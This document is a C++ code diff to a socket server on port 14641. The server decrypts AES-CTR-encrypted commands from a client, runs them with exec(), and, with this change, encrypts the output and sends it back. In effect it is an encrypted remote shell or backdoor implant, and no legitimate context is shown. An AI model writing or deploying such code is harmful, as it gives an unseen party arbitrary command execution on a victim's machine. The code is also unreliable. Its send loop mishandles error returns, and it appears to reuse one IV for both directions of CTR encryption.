@@ -19,6 +19,16 @@ extern "C" {
 constexpr auto PORT = "14641";
 constexpr auto BACKLOG = 10;
 
+bool send_results(int new_sockfd, const char* result, int total_length){
+    int total_sent = 0;
+    while(total_sent < total_length){
+        int bytes_sent = send(new_sockfd, result + total_sent, total_length - total_sent, 0);
+        if(bytes_sent == 0) return false;
+        total_sent += bytes_sent;
+    }
+    return true;
+}
+
 std::string exec(const char* cmd) {
     std::array<char, 128> buffer;
     std::string result;
@@ -165,8 +175,18 @@ void command_loop(int new_sockfd, std::string symmetric_key){
         std::string dec_command = aes_ctr(std::string(enc_command.begin(), enc_command.end()), symmetric_key, iv);
         std::cout << dec_command << std::endl;
 
-        std::string output = exec(dec_command.c_str());
-        std::cout << "Output: " << '\n' << output << '\n';
+        std::string result = exec(dec_command.c_str());
+
+        std::string enc_result = aes_ctr(result, symmetric_key, iv);
+
+        uint32_t enc_result_size = htonl(enc_result.size());
+        int enc_result_size_status = send(new_sockfd, &enc_result_size, sizeof(enc_result_size), 0);
+        if(enc_result_size_status == -1){
+            std::cerr << "Error while sending results size\n";
+        }
+        if(!send_results(new_sockfd, enc_result.data(), enc_result.size())){
+            std::cerr << "Error while sending results\n";
+        }
     }
     close(new_sockfd);
 }
